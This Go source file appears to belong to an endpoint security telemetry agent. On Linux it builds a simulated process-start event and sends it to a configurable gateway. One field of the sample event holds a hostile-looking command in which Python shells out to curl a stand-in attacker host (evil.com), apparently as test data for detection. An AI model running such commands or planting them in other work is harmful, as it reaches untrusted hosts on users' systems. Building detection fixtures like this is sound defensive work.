//go:build linux

package main

import (
	"encoding/json"
	"log"
	"os"
	"runtime"
	"time"
)

// Linux-specific agent capabilities
func init() {
	log.Printf("MUSAFIR Agent starting on Linux %s", runtime.GOARCH)
}

func generateLinuxEvent() Envelope {
	// Simulate Linux-specific telemetry
	hostname, _ := os.Hostname()

	return Envelope{
		Ts:       time.Now().UTC().Format(time.RFC3339),
		TenantID: "t-aci",
		Asset: map[string]string{
			"id":   hostname,
			"type": "endpoint",
			"os":   "linux",
			"ip":   "10.10.1.16",
		},
		User: map[string]string{
			"id":  "uid:1000",
			"sid": "1000",
		},
		Event: map[string]interface{}{
			"class":    "process",
			"name":     "process_start",
			"severity": 3,
			"attrs": map[string]interface{}{
				"image": "/usr/bin/python3",
				"cmd":   "python3 -c 'import os; os.system(\"curl evil.com\")'",
				"ppid":  1024,
				"pid":   2048,
			},
		},
		Ingest: map[string]string{
			"agent_version": "0.0.1",
			"schema":        "ocsf:1.2",
			"platform":      "linux",
		},
	}
}

func main() {
	gatewayURL := os.Getenv("GATEWAY_URL")
	if gatewayURL == "" {
		gatewayURL = "http://localhost:8080"
	}

	// Generate Linux-specific event
	evt := generateLinuxEvent()
	data, _ := json.Marshal(evt)
	log.Printf("Linux agent event: %s", string(data))

	// Send to gateway (same HTTP logic as main.go)
	sendEventToGateway(gatewayURL, data)
}
